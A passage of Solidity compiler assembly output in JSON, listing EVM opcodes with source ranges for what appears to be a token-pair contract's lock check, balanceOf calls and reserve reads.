											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 7243,
											"end": 7274,
											"name": "PUSH [tag]",
											"value": "176"
										},
										{
											"begin": 7253,
											"end": 7273,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": 7253,
											"end": 7260,
											"name": "DUP8"
										},
										{
											"begin": 7265,
											"end": 7272,
											"name": "DUP8"
										},
										{
											"begin": 7253,
											"end": 7273,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 7253,
											"end": 7264,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 7253,
											"end": 7273,
											"name": "AND"
										},
										{
											"begin": 7253,
											"end": 7273,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7243,
											"end": 7297,
											"name": "tag",
											"value": "299"
										},
										{
											"begin": 7243,
											"end": 7297,
											"name": "JUMPDEST"
										},
										{
											"begin": 7231,
											"end": 7297,
											"name": "SWAP9"
										},
										{
											"begin": 7231,
											"end": 7297,
											"name": "POP"
										},
										{
											"begin": 7311,
											"end": 7352,
											"name": "PUSH [tag]",
											"value": "302"
										},
										{
											"begin": 7330,
											"end": 7331,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 7311,
											"end": 7321,
											"name": "PUSH [tag]",
											"value": "303"
										},
										{
											"begin": 7311,
											"end": 7352,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7311,
											"end": 7352,
											"name": "tag",
											"value": "302"
										},
										{
											"begin": 7311,
											"end": 7352,
											"name": "JUMPDEST"
										},
										{
											"begin": 7311,
											"end": 7352,
											"name": "POP"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "PUSH [tag]",
											"value": "304"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "JUMP"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "tag",
											"value": "298"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "JUMPDEST"
										},
										{
											"begin": 7450,
											"end": 7582,
											"name": "PUSH [tag]",
											"value": "305"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7476,
											"end": 7513,
											"name": "DUP10"
										},
										{
											"begin": 7476,
											"end": 7513,
											"name": "AND"
										},
										{
											"begin": 7476,
											"end": 7501,
											"name": "PUSH [tag]",
											"value": "224"
										},
										{
											"begin": 7476,
											"end": 7483,
											"name": "DUP7"
										},
										{
											"begin": 7488,
											"end": 7500,
											"name": "DUP5"
										},
										{
											"begin": 7476,
											"end": 7501,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 7476,
											"end": 7487,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 7476,
											"end": 7501,
											"name": "AND"
										},
										{
											"begin": 7476,
											"end": 7501,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7450,
											"end": 7582,
											"name": "tag",
											"value": "305"
										},
										{
											"begin": 7450,
											"end": 7582,
											"name": "JUMPDEST"
										},
										{
											"begin": 7438,
											"end": 7582,
											"name": "SWAP9"
										},
										{
											"begin": 7438,
											"end": 7582,
											"name": "POP"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "tag",
											"value": "304"
										},
										{
											"begin": 7194,
											"end": 7593,
											"name": "JUMPDEST"
										},
										{
											"begin": 7622,
											"end": 7623,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7610,
											"end": 7619,
											"name": "DUP10"
										},
										{
											"begin": 7610,
											"end": 7623,
											"name": "GT"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH [tag]",
											"value": "310"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "JUMPI"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "MSTORE"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "ADD"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP1"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP1"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "ADD"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP3"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SUB"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP3"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "MSTORE"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "MSTORE"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "ADD"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP1"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH data",
											"value": "6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SWAP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "CODECOPY"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "ADD"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SWAP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "POP"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "POP"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "MLOAD"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "DUP1"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SWAP2"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SUB"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "SWAP1"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "REVERT"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "tag",
											"value": "310"
										},
										{
											"begin": 7602,
											"end": 7668,
											"name": "JUMPDEST"
										},
										{
											"begin": 7678,
											"end": 7703,
											"name": "PUSH [tag]",
											"value": "311"
										},
										{
											"begin": 7689,
											"end": 7691,
											"name": "DUP11"
										},
										{
											"begin": 7693,
											"end": 7702,
											"name": "DUP11"
										},
										{
											"begin": 7678,
											"end": 7688,
											"name": "PUSH [tag]",
											"value": "303"
										},
										{
											"begin": 7678,
											"end": 7703,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7678,
											"end": 7703,
											"name": "tag",
											"value": "311"
										},
										{
											"begin": 7678,
											"end": 7703,
											"name": "JUMPDEST"
										},
										{
											"begin": 7678,
											"end": 7703,
											"name": "POP"
										},
										{
											"begin": 7714,
											"end": 7763,
											"name": "PUSH [tag]",
											"value": "231"
										},
										{
											"begin": 7722,
											"end": 7730,
											"name": "DUP7"
										},
										{
											"begin": 7732,
											"end": 7740,
											"name": "DUP7"
										},
										{
											"begin": 7742,
											"end": 7751,
											"name": "DUP11"
										},
										{
											"begin": 7753,
											"end": 7762,
											"name": "DUP11"
										},
										{
											"begin": 7714,
											"end": 7721,
											"name": "PUSH [tag]",
											"value": "186"
										},
										{
											"begin": 7714,
											"end": 7763,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "tag",
											"value": "130"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMPDEST"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP4"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP5"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP3"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "MSTORE"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SWAP1"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "KECCAK256"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "SLOAD"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "DUP2"
										},
										{
											"begin": 389,
											"end": 453,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "tag",
											"value": "132"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMPDEST"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "SLOAD"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "DUP2"
										},
										{
											"begin": 641,
											"end": 659,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "tag",
											"value": "134"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "JUMPDEST"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "316"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "316"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 18612,
											"end": 18618,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 18612,
											"end": 18618,
											"name": "SLOAD"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP2"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MSTORE"
										},
										{
											"begin": 18638,
											"end": 18642,
											"name": "ADDRESS"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP3"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "ADD"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MSTORE"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MLOAD"
										},
										{
											"begin": 18584,
											"end": 18751,
											"name": "PUSH [tag]",
											"value": "318"
										},
										{
											"begin": 18584,
											"end": 18751,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18612,
											"end": 18618,
											"name": "AND"
										},
										{
											"begin": 18612,
											"end": 18618,
											"name": "SWAP2"
										},
										{
											"begin": 18605,
											"end": 18629,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18605,
											"end": 18629,
											"name": "SWAP2"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP4"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "ADD"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP3"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP3"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP2"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP3"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SUB"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "ADD"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP2"
										},
										{
											"begin": 18612,
											"end": 18618,
											"name": "DUP7"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "DUP1"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "319"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "319"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "GAS"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "STATICCALL"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "320"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "320"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MLOAD"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "321"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "321"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "MLOAD"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "SLOAD"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP2"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MSTORE"
										},
										{
											"begin": 18691,
											"end": 18695,
											"name": "ADDRESS"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP3"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "ADD"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MSTORE"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "SWAP1"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "SWAP3"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "AND"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "SWAP2"
										},
										{
											"begin": 18658,
											"end": 18682,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18658,
											"end": 18682,
											"name": "SWAP2"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP3"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "ADD"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP3"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18605,
											"end": 18644,
											"name": "SWAP3"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP2"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP3"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SWAP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "SUB"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "ADD"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP2"
										},
										{
											"begin": 18665,
											"end": 18671,
											"name": "DUP7"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "DUP1"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "322"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "322"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "GAS"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "STATICCALL"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "323"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "323"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MLOAD"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "324"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "324"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18658,
											"end": 18697,
											"name": "MLOAD"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "DUP1"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "DUP3"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "AND"
										},
										{
											"begin": 18711,
											"end": 18719,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18733,
											"end": 18741,
											"name": "SWAP1"
										},
										{
											"begin": 18733,
											"end": 18741,
											"name": "DIV"
